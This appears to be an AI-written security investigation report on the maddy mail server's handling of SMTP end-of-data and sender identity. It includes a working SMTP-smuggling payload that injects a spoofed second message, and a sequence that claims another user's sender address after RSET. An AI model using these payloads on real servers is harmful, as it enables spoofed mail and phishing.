SENT-BYTES DATA-PAYLOAD: b'Subject: D4 bare LF.LF\r\nFrom: Probe <outsider@external.example>\r\nTo: <alice@example.org>\r\n\r\nbody four\n.\n'
<<< 250 2.0.0 OK: queued
>>> NOOP (liveness probe)
<<< 250 2.0.0 I have sucessfully done nothing
CONN-STATE-AFTER-DATA: OPEN
```

Exact stored bytes (`…/messages/f79f92fd0a88a299b51d818f69a645d0`):

```
b'…\r\nSubject: D4 bare LF.LF\r\nFrom: Probe <outsider@external.example>\r\nTo: <alice@example.org>\r\n\r\nbody four\n'
```

The bare‑`<LF>` sequence `\n.\n` **is accepted** as end‑of‑data (`250 … OK: queued`) and the body `body four\n` is stored. This is the `dotReader` `stateDot`+`\n`→`stateEOF` transition (`reader.go:L349‑L351`). Identical on :587 across two runs.

## 2.8 D5 — bare `<LF>.<CR><LF>` end‑of‑data (canonical smuggling variant)

Body `body five\n.\r\n` — the exact non‑standard terminator at the heart of the 2023 SMTP‑smuggling CVEs.

```
>>> DATA
<<< 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>
SENT-BYTES DATA-PAYLOAD: b'Subject: D5 bare LF.CRLF\r\nFrom: Probe <outsider@external.example>\r\nTo: <alice@example.org>\r\n\r\nbody five\n.\r\n'
<<< 250 2.0.0 OK: queued
>>> NOOP (liveness probe)
<<< 250 2.0.0 I have sucessfully done nothing
CONN-STATE-AFTER-DATA: OPEN
```

Exact stored bytes (`…/messages/7a05e91f1471dbdb725c14d2a248c993`):

```
b'…\r\nSubject: D5 bare LF.CRLF\r\nFrom: Probe <outsider@external.example>\r\nTo: <alice@example.org>\r\n\r\nbody five\n'
```

The `<LF>.<CR><LF>` sequence **is accepted** as end‑of‑data. In `dotReader` terms, the bare `\n` after `body five` ends the line (`stateData`+`\n`→`stateBeginLine`, `reader.go:L382‑L383`), the `.` enters `stateDot`, the `\r` moves to `stateDotCR`, and the final `\n` reaches `stateEOF` (`reader.go:L358`). Identical on :587 across two runs.

## 2.9 D6 — end‑to‑end smuggling injection (observed security impact)

D4/D5 show maddy *accepts* the bare‑`<LF>` terminator. D6 demonstrates the **consequence**: with a single upstream DATA payload whose carrier body ends in the non‑standard `\n.\r\n`, the trailing bytes form a **complete second SMTP transaction** that maddy accepts and stores as a distinct, spoofed message. This is the parsing‑differential injection described by VU#302671 / CVE‑2023‑51764‑class. Run on :25, reproduced across two runs.

```
>>> DATA
<<< 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>
SENT-BYTES DATA-PAYLOAD(carrier + smuggled transaction): b'Subject: D6 carrier\r\nFrom: Carrier <outsider@external.example>\r\nTo: <alice@example.org>\r\n\r\ncarrier body\n.\r\nMAIL FROM:<smuggled@external.example>\r\nRCPT TO:<alice@example.org>\r\nDATA\r\nSubject: SMUGGLED-INJECTED\r\nFrom: Attacker <smuggled@external.example>\r\nTo: <alice@example.org>\r\n\r\nsmuggled injected body\r\n.\r\n'
<<< 250 2.0.0 OK: queued
<<< 250 2.0.0 Roger, accepting mail from <smuggled@external.example>
<<< 250 2.0.0 I'll make sure <alice@example.org> gets this
<<< 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>
<<< 250 2.0.0 OK: queued
CONN: OPEN
>>> QUIT
<<< 221 2.0.0 Goodnight and good luck
NEW STORED MESSAGES: 2  (2 => a SECOND message was injected)
```

**Two** messages were stored. The carrier:

```
b'Delivered-To: alice@example.org\r\nReturn-Path: <outsider@external.example>\r\nReceived: from probe.client.example (localhost [127.0.0.1]) by example.org\r\n (envelope-sender <outsider@external.example>) with ESMTP id 68d02038; Mon,\r\n 13 Jul 2026 16:48:44 +0000\r\nSubject: D6 carrier\r\nFrom: Carrier <outsider@external.example>\r\nTo: <alice@example.org>\r\n\r\ncarrier body\n'
```

…and the **injected, spoofed** message, delivered with envelope‑sender `smuggled@external.example`:

```
b'Delivered-To: alice@example.org\r\nReturn-Path: <smuggled@external.example>\r\nReceived: from probe.client.example (localhost [127.0.0.1]) by example.org\r\n (envelope-sender <smuggled@external.example>) with ESMTP id a8b74a36; Mon,\r\n 13 Jul 2026 16:48:44 +0000\r\nSubject: SMUGGLED-INJECTED\r\nFrom: Attacker <smuggled@external.example>\r\nTo: <alice@example.org>\r\n\r\nsmuggled injected body\n'
```

The `-debug` log shows **two distinct** `incoming message` lines with **different senders** from the one client connection:

```
smtp: incoming message	{"msg_id":"68d02038","sender":"outsider@external.example","src_host":"probe.client.example","src_ip":"127.0.0.1:35772"}
smtp: accepted	{"msg_id":"68d02038"}
smtp: incoming message	{"msg_id":"a8b74a36","sender":"smuggled@external.example","src_host":"probe.client.example","src_ip":"127.0.0.1:35772"}
smtp: accepted	{"msg_id":"a8b74a36"}
```

Because maddy ends the carrier body at `\n.\r\n`, the remainder (`MAIL FROM:<smuggled@…>` onward) is parsed as a fresh, valid transaction. An upstream MTA that requires strict `<CRLF>.<CRLF>` would have forwarded the whole blob as a single body; maddy’s more lenient boundary is exactly the differential SMTP smuggling exploits. *(This report observes and characterises the behaviour; per the read‑only mandate it does not remediate it.)*

## 2.10 Repeatability (Q1)

Every condition D1–D5 was run **twice on each listener** (:25 and :587), and D6 twice on :25. All runs produced **identical** wire replies, identical `-debug` cycles, and byte‑identical stored messages (only the per‑message `id`, `Message-Id`, timestamp, and client source port differ, as expected). No run‑to‑run inconsistency was observed.


---

# 3. Q2 — Authentication‑identity reuse across transactions

## 3.1 Answer (observed)

- **(a) Outcome: for a local‑domain B, the command is ALLOWED to proceed in a way that blurs accountability.** After authenticating as A, issuing `MAIL FROM:<A>`, `RSET`, then `MAIL FROM:<B>` **without re‑authenticating**, maddy replies `250 2.0.0 Roger, accepting mail from <bob@example.org>` and delivers the message. It is neither rejected nor re‑bound to A — the connection stays authenticated as **A** while the envelope sender is the freshly claimed **B**. (For a **non‑local** B the transaction is rejected later, at `RCPT`, by the submission anti‑spoof guard — §3.7 — but on a *domain‑locality* basis, not an identity‑binding one.)
- **(b) The trusted identity per sink:**
  1. **Headers** → **B**. The `Received` trace records the envelope sender (B), not the authenticated user.
  2. **Queue metadata** (`.meta`) → **A is excluded; B is retained.** The connection state (which carries `AuthUser` = A) is nulled before serialization, so A never reaches disk; the envelope sender B is persisted.
  3. **Enforcement checks / command hook** → **A**. The command‑check placeholder `{auth_user}` resolves to the connection’s `AuthUser` (A) even while `{sender}` is B.

The single clearest runtime signal is one `-debug` line emitted at delivery start that carries **both** `sender=<B>` **and** `username=<A>` simultaneously (§3.5). A repository‑wide search confirms there is **no** `MAIL FROM`‑to‑`AuthUser` binding check in this version (§3.8): the default pipeline constrains the sender only by **source‑domain locality**.

## 3.2 Standards framing (factual)

**RFC 6409** (message submission; successor to RFC 4409) requires authentication on the submission port and **permits** a submission server to enforce or rewrite the sender identity — but it does **not mandate** that `MAIL FROM` equal the authenticated user. Binding is an implementation policy choice. maddy’s default is the permissive end of that spectrum: it authenticates the connection but binds the envelope sender only by domain locality, as the evidence below shows.

## 3.3 The code path (grounded)

- The authenticated identity is bound **once**, at session creation: `newSession()` (`internal/endpoint/smtp/smtp.go:L674`) sets `AuthUser: username` (`L680`) on the connection state `s.connState`. Submission forces authentication via `authAlwaysRequired` (set at `smtp.go:L590`); `Login()` (`L643`) reaches `newSession`.
- `RSET` invokes `Session.Reset()` (`smtp.go:L60`), whose `abort()` helper (`L67`) clears **only envelope state** — `mailFrom` (`L74`), `opts` (`L75`), `msgMeta` (`L76`), `delivery` (`L77`), `deliveryErr` (`L78`), `msgCtx` (`L79`). It **never** touches `s.connState`, so the authenticated identity **persists** for the lifetime of the connection.
- Each new transaction re‑references the same connection state via `Conn: &s.connState` (`smtp.go:L86`) while storing the freshly claimed sender independently as `msgMeta.OriginalFrom = cleanFrom` (`smtp.go:L116`).

So after `RSET`, a new `MAIL FROM:<B>` is accepted and recorded as `OriginalFrom = B`, while `Conn.AuthUser` remains `A`. That divergence is what the three sinks expose differently.

## 3.4 E1 — local‑domain B: full transcript

A = `alice@example.org`, B = `bob@example.org` (a *different* local user). Run twice; identical.

```
########## Q2 E1  (A=alice@example.org  B=bob@example.org) ##########
<<< 220 example.org ESMTP Service Ready
>>> EHLO probe.client.example
<<< 250-Hello probe.client.example
<<< 250-PIPELINING
<<< 250-8BITMIME
<<< 250-ENHANCEDSTATUSCODES
<<< 250-AUTH PLAIN
<<< 250-SMTPUTF8
<<< 250 SIZE 33554432
>>> AUTH PLAIN <base64 for alice@example.org>
<<< 235 2.0.0 Authentication succeeded
>>> MAIL FROM:<alice@example.org>
<<< 250 2.0.0 Roger, accepting mail from <alice@example.org>
>>> RSET
<<< 250 2.0.0 Session reset
>>> MAIL FROM:<bob@example.org>
<<< 250 2.0.0 Roger, accepting mail from <bob@example.org>
>>> RCPT TO:<carol@remote.example>
<<< 250 2.0.0 I'll make sure <carol@remote.example> gets this
>>> DATA
<<< 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>
SENT-BYTES DATA-PAYLOAD: b'Subject: Q2 E1\r\nFrom: Claimed <bob@example.org>\r\nTo: <carol@remote.example>\r\n\r\nq2 body for E1\r\n.\r\n'
<<< 250 2.0.0 OK: queued
>>> QUIT
<<< 221 2.0.0 Goodnight and good luck
```

The second `MAIL FROM:<bob@example.org>` — issued after `RSET`, with **no** re‑authentication — is accepted (`250 … Roger, accepting mail from <bob@example.org>`). This is outcome **(a) = allowed to proceed**. The recipient `carol@remote.example` is non‑local, so the message is routed to the `queue` target, producing the `.meta`/`.header`/`.body` evidence files.

## 3.5 Primary runtime signal — one log line, two identities

The delivery‑start log is emitted inside the guard `if s.connState.AuthUser != ""` (`smtp.go:L127`) by `s.log.Msg("incoming message", …)` (`L128`), whose fields include `"sender", from` (`L131`) and `"username", s.connState.AuthUser` (`L133`). The captured line for E1 carries **both** identities at once:

```
submission: incoming message	{"msg_id":"7c511d63","sender":"bob@example.org","src_host":"probe.client.example","src_ip":"127.0.0.1:40346","username":"alice@example.org"}
```

`sender=bob@example.org` (**B**, the claimed envelope sender) and `username=alice@example.org` (**A**, the authenticated identity) appear on the same line — the clearest single observation that A remains the trusted authenticated identity while B is the accepted claimed sender.

## 3.6 The three delivery sinks (E1, observed)

### Sink 1 — Headers → **B**

The queued `.header` file (`/tmp/maddy-test/queue/7c511d63.header`, captured by the poller):

```
Received:  by example.org (envelope-sender <bob@example.org>) with ESMTP id
 7c511d63; Mon, 13 Jul 2026 16:52:39 +0000
Date: Mon, 13 Jul 2026 16:52:39 +0000
Message-Id: <4abc90b4-d6a5-4c18-a1cc-dc22e405e43b@example.org>
Subject: Q2 E1
From: Claimed <bob@example.org>
To: <carol@remote.example>
```

The `Received` trace records `envelope-sender <bob@example.org>` — **B**, not A. This is `GenerateReceived(ctx, msgMeta, ourHostname, mailFrom)` (`internal/target/received.go:L19`), called at `smtp.go:L303` with `s.msgMeta.OriginalFrom` (= B); the `(envelope-sender <…>)` clause is emitted unconditionally (`received.go:L69‑L71`). The client‑trace `from <host> [ip]` clause is suppressed on submission (`DontTraceSender = true`, `submission.go:L28`), which is why the `Received:` line has a **double space** where that clause would be. `submissionPrepare()` (`submission.go:L27`) validated that a `From` header is present (it returns `554 5.6.0` if missing, `submission.go:L39‑L48`) and synthesized `Date`/`Message-Id`, but it **never matched `From` to `AuthUser`** — the header `From: Claimed <bob@example.org>` and envelope‑sender B were accepted despite the connection being authenticated as A.

### Sink 2 — Queue metadata (`.meta`) → **A excluded, B retained**

The persisted `.meta` JSON (`/tmp/maddy-test/queue/7c511d63.meta`), unedited:

```
{"MsgMeta":{"ID":"7c511d63","OriginalFrom":"bob@example.org","DontTraceSender":true,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"bob@example.org","To":["carol@remote.example"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{},"TriesCount":0,"FirstAttempt":"2026-07-13T16:52:38.368329859Z","LastAttempt":"2026-07-13T16:52:38.368329934Z"}
```

Programmatic checks on that exact file:

```
META-CHECK From = 'bob@example.org'
META-CHECK MsgMeta.OriginalFrom = 'bob@example.org'
META-CHECK MsgMeta has Conn key?  True  value= None
META-CHECK 'AuthUser' substring in raw .meta?  False
```

The record’s `From` and `MsgMeta.OriginalFrom` are both **B** (`bob@example.org`); `MsgMeta.Conn` is `null`; and the substring `AuthUser` does **not** occur anywhere in the file. This is exactly the behaviour of `internal/target/queue/queue.go`: the on‑disk record type is `QueueMetadata` (`L149`) with a top‑level `From` field (`L151`); `updateMetadataOnDisk()` (`L742`) deep‑copies the metadata (`L751`), then sets `metaCopy.MsgMeta.Conn = nil` (`L752`) **immediately before** `json.NewEncoder(file).Encode(metaCopy)` (`L754`). Because `AuthUser` lives on `Conn` (`msgmetadata.go:ConnState.AuthUser L37`), nulling `Conn` **deliberately drops A** from the persisted `.meta`, while `From`/`OriginalFrom` (B) are retained. The poller also captured the transient pre‑rename temp file `7c511d63.meta.new` that `updateMetadataOnDisk()` writes via `os.Create(metaPath + ".new")` — byte‑identical to the final `.meta`.

### Sink 3 — Enforcement checks / command hook → **A**

The command check (`run_on sender`) fired during E1 and recorded:

```
COMMAND-CHECK stage=sender auth_user=[alice@example.org] sender=[bob@example.org] source_ip=[127.0.0.1]
```

`{auth_user}` resolved to **A** (`alice@example.org`) while `{sender}` is **B** (`bob@example.org`). This *is* the “command hook” Q2 names: `expandCommand()` (`internal/check/command/command.go:L139`) handles `case "{auth_user}":` (`L145`) by `return s.msgMeta.Conn.AuthUser` (`L149`) — the connection’s authenticated identity — whereas `{sender}` (`case "{sender}":` at `command.go:L178`, `return s.mailFrom` at `L179`) is the claimed `MAIL FROM`. A command‑based check therefore sees the authenticated **A**, never the claimed **B**.

Two further `AuthUser` consumers exist but are **not** `MAIL FROM`‑binding checks (grounded, context only): `internal/target/smtp_downstream/sasl.go` uses `msgMeta.Conn.AuthUser` (null‑check `L31`) to forward SASL PLAIN credentials to a downstream server (`sasl.NewPlainClient("", msgMeta.Conn.AuthUser, msgMeta.Conn.AuthPassword)`, `L41`); and `internal/modify/dkim/dkim.go` reads `authUser = s.meta.Conn.AuthUser` (`L345`) purely for DKIM signer selection (`shouldSign(… OriginalFrom, authUser)`, `L348`).


## 3.7 E2 — non‑local‑domain B: the anti‑spoof guard

Same sequence as E1 but B = `bob@notlocal.example` (a non‑local sender domain). Run twice; identical.

```
########## Q2 E2  (A=alice@example.org  B=bob@notlocal.example) ##########
>>> AUTH PLAIN <base64 for alice@example.org>
<<< 235 2.0.0 Authentication succeeded
>>> MAIL FROM:<alice@example.org>
<<< 250 2.0.0 Roger, accepting mail from <alice@example.org>
>>> RSET
<<< 250 2.0.0 Session reset
>>> MAIL FROM:<bob@notlocal.example>
<<< 250 2.0.0 Roger, accepting mail from <bob@notlocal.example>
>>> RCPT TO:<carol@remote.example>
<<< 501 5.1.8 Non-local sender domain (msg ID = 4ae75cde)
>>> DATA
<<< 502 5.5.1 Missing RCPT TO command.
SENT-BYTES DATA-PAYLOAD: b'Subject: Q2 E2\r\nFrom: Claimed <bob@notlocal.example>\r\nTo: <carol@remote.example>\r\n\r\nq2 body for E2\r\n.\r\n'
<<< 501 5.5.2 Bad command
<<< 501 5.5.2 Bad command
<<< 501 5.5.2 Bad command
<<< 500 5.5.2 Speak up
<<< 501 5.5.2 Bad command
<<< 501 5.5.2 Bad command
>>> QUIT
<<< 221 2.0.0 Goodnight and good luck
```

Two observed subtleties, both grounded:

- The `MAIL FROM:<bob@notlocal.example>` gets a **provisional** `250 … Roger`, and the rejection surfaces at **`RCPT`** as `501 5.1.8 Non-local sender domain`. This deferral of the sender reject from `MAIL FROM` to `RCPT` is maddy’s default `defer_sender_reject` behaviour (`smtp.go:L567`). The `-debug` log shows the reject and the aborted transaction:

  ```
  submission: incoming message	{"msg_id":"4ae75cde","sender":"bob@notlocal.example","src_host":"probe.client.example","src_ip":"127.0.0.1:40358","username":"alice@example.org"}
  submission: RCPT error	{"effective_rcpt":"carol@remote.example","rcpt":"carol@remote.example","reason":"reject directive used","smtp_code":501,"smtp_enchcode":"5.1.8","smtp_msg":"Non-local sender domain"}
  submission: aborted	{"msg_id":"4ae75cde"}
  ```

  (The trailing `501 5.5.2 Bad command` / `500 5.5.2 Speak up` replies are the aborted `DATA` payload’s header/body lines re‑entering the command loop — the same command‑loop parsing effect documented for Q1 §2.5.)

- Even in the rejected case, the enforcement/command hook still fired and still saw **A** as `auth_user` while the claimed sender was the non‑local **B**:

  ```
  COMMAND-CHECK stage=sender auth_user=[alice@example.org] sender=[bob@notlocal.example] source_ip=[127.0.0.1]
  ```

Crucially, the reject is driven by the submission `default_source { reject 501 5.1.8 "Non-local sender domain" }` guard (repo `maddy.conf:L117‑L118`), which keys on the **sender’s domain locality** — not on whether the sender equals the authenticated user. A local‑domain B (E1) sails through the same guard because `bob@example.org` *is* in `$(local_domains)`; the guard never compares B to A.

## 3.8 The negative result — no `MAIL FROM`‑to‑`AuthUser` binding (observed)

A repository‑wide search for any `authorize_sender`‑style binding of the envelope sender to the authenticated user returns **no such check**. Every internal use of `Conn.AuthUser` is accounted for and none binds `MAIL FROM` to the authenticated identity:

| Use site | Purpose | Binds MAIL FROM→auth? |
|----------|---------|-----------------------|
| `internal/endpoint/smtp/smtp.go:L127,L133` | delivery‑start log fields (`username`) | No — logging only |
| `internal/target/smtp_downstream/sasl.go:L31,L41` | forward SASL PLAIN credentials downstream | No — credential relay |
| `internal/check/command/command.go:L149` | expand `{auth_user}` for a command check | No — exposes A to the hook |
| `internal/modify/dkim/dkim.go:L345,L348` | DKIM signer selection | No — signer choice only |
| `testutils/smtp_server.go:L127` | test harness | No — test only |

The default pipeline therefore binds `MAIL FROM` only by **source‑domain locality** (the `501 5.1.8` / `550 5.1.1` structural guards), consistent with the guaranteed check order `CheckConnection, CheckSender, CheckRcpt, CheckBody` (`HACKING.md:L118`) and the `exterrors.SMTPError` error model (`HACKING.md:L75`). This confirms outcome (a): for a local B the second `MAIL FROM` is *allowed to proceed*, and the divergence between the authenticated A and the claimed B is exactly what the three sinks record differently.

## 3.9 Repeatability (Q2)

E1 (local B) and E2 (non‑local B) were each run **twice**. Both are stable: E1 always accepts B and yields the same three‑sink values (headers = B, `.meta` `Conn=null`/`From=B`, command hook `auth_user=A`); E2 always rejects at `RCPT` with `501 5.1.8`. The `sender=B` / `username=A` log line appears on every E1 and E2 run. No inconsistency was observed.


---

# 4. Coverage pass

Every named part of both questions, confirmed answered with observed evidence:

**Q1**
- [x] **(a) outcome** — *stops reading at the first lone dot* (not “continues consuming”, not “unexpected state”). §2.1, §2.5.
- [x] **(b) runtime signs** — wire replies (`250 OK: queued`, then `500 5.5.2` / `501 5.5.2` for trailing bytes), `-debug` single `incoming message`/`accepted` cycle, connection stays **OPEN** (`NOOP → 250`). §2.5.
- [x] **(c) stored/queued bytes** — body up to but excluding the first lone dot; `Line B` absent. §2.5.
- [x] standard `<CRLF>.<CRLF>` — §2.4 (D1).
- [x] embedded lone dot (primary) — §2.5 (D2).
- [x] dot‑stuffing `..stuffed` → single `.` — §2.6 (D3).
- [x] bare `<LF>.<LF>` accepted — §2.7 (D4).
- [x] bare `<LF>.<CR><LF>` accepted — §2.8 (D5).
- [x] end‑to‑end smuggling injection (2 messages) — §2.9 (D6).
- [x] run on **both** listeners (:25 unauth and :587 auth) — every D1–D5 shown on both.
- [x] ≥2‑run repeatability — §2.10.
- [x] `Session.Data → prepareBody → newDataReader → dotReader` grounding with runtime‑confirmed external line numbers — §2.3, §1.10.

**Q2**
- [x] **(a) outcome** — local B *allowed to proceed / blurs accountability*; non‑local B rejected at RCPT on a domain‑locality basis. §3.1, §3.4, §3.7.
- [x] **(b) sink 1 — headers** → **B** (`Received` envelope‑sender). §3.6 Sink 1.
- [x] **(b) sink 2 — queue metadata** (`.meta`) → **A excluded (`Conn=null`), B retained (`From`/`OriginalFrom`)**. §3.6 Sink 2.
- [x] **(b) sink 3 — enforcement checks / command hook** → **A** (`{auth_user}` = A while `{sender}` = B). §3.6 Sink 3.
- [x] local‑domain B — §3.4 (E1).
- [x] non‑local‑domain B → `501 5.1.8` — §3.7 (E2).
- [x] the `sender=B` / `username=A` delivery‑start log line quoted — §3.5.
- [x] no `MAIL FROM`→`AuthUser` binding (negative result) — §3.8.
- [x] ≥2‑run repeatability — §3.9.
- [x] `newSession`/`Reset`/`abort`/`OriginalFrom` grounding — §3.3.

**Cross‑product:** the local‑B × non‑local‑B cases were both run through the full `AUTH A → MAIL FROM A → RSET → MAIL FROM B` sequence (E1 and E2), each twice.

---

# 5. Cleanup and repository state

All runtime scaffolding lived outside the checkout, under `/tmp`:

- `/tmp/maddy-bin`, `/tmp/maddyctl-bin` — built binaries.
- `/tmp/maddy-test/maddy.conf`, `/tmp/maddy-test/logauth.sh` — test config and enforcement helper.
- `/tmp/maddy-test/state/`, `/tmp/maddy-test/runtime/`, `/tmp/maddy-test/queue/` — SQLite databases, runtime sockets, queue files.
- `/tmp/maddy-test/captures/` — probe transcripts, `-debug` log, enforcement‑check log.
- the raw‑socket probe scripts under `/tmp/maddy-test/`.

On completion the maddy server was stopped and **all** of the above were removed, leaving the repository byte‑for‑byte unchanged except for this one document. The verified final state:

```
$ git status --porcelain --untracked-files=all
?? blitzy/documentation/maddy_26452dd8dd78.md

$ git status --porcelain --untracked-files=all -- . ':!blitzy/documentation/maddy_26452dd8dd78.md'
$        # (empty — no other repository file changed)

$ ls /tmp/maddy-test /tmp/maddy-bin /tmp/maddyctl-bin 2>&1
ls: cannot access '/tmp/maddy-test': No such file or directory
ls: cannot access '/tmp/maddy-bin': No such file or directory
ls: cannot access '/tmp/maddyctl-bin': No such file or directory
```

The only repository change is the addition of `blitzy/documentation/maddy_26452dd8dd78.md`. `HEAD` remains `26452dd8dd787dc455278b0fdd296f4a5432c768`; no existing source, config, manifest, or test file was modified.

